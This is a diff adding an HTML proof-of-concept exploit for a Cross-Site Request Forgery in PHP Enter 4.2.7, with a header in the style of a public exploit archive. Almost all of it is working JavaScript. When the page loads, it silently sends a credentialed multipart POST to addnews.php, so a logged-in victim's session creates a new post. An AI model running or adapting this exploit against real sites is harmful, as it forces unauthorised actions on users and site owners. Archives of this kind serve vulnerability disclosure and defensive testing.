@@ -1,0 +1,83 @@
+<!--
+# Exploit Title :              PHP Enter 4.2.7 - Cross-Site Request Forgery  (Add New Post)
+# Author :                      Besim
+# Google Dork :                 -
+# Date :                         11/10/2016
+# Type :                         webapps
+# Platform :                    PHP  
+# Vendor Homepage :   http://www.phpenter.net
+# Software link :            http://www.hotscripts.com/listings/jump/download/150217
+
+########################### CSRF PoC ###############################
+-->
+
+<html>
+  <!-- CSRF PoC  -->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://site_name/path/addnews.php", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------4485886114928592041224662482");
+        xhr.withCredentials = true;
+        var body = "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"univer\"\r\n" + 
+          "\r\n" + 
+          "2016074155\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"idblog\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"usercc\"\r\n" + 
+          "\r\n" + 
+          "root\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"editor\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"badress\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"bname\"\r\n" + 
+          "\r\n" + 
+          "Test\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"summary\"\r\n" + 
+          "\r\n" + 
+          "Test\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"image\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"main\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"amess\"\r\n" + 
+          "\r\n" + 
+          "\x3cp\x3eTestttt\x3c/p\x3e\r\n" + 
+          "-----------------------------4485886114928592041224662482\r\n" + 
+          "Content-Disposition: form-data; name=\"query\"\r\n" + 
+          "\r\n" + 
+          "Submit\r\n" + 
+          "-----------------------------4485886114928592041224662482--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
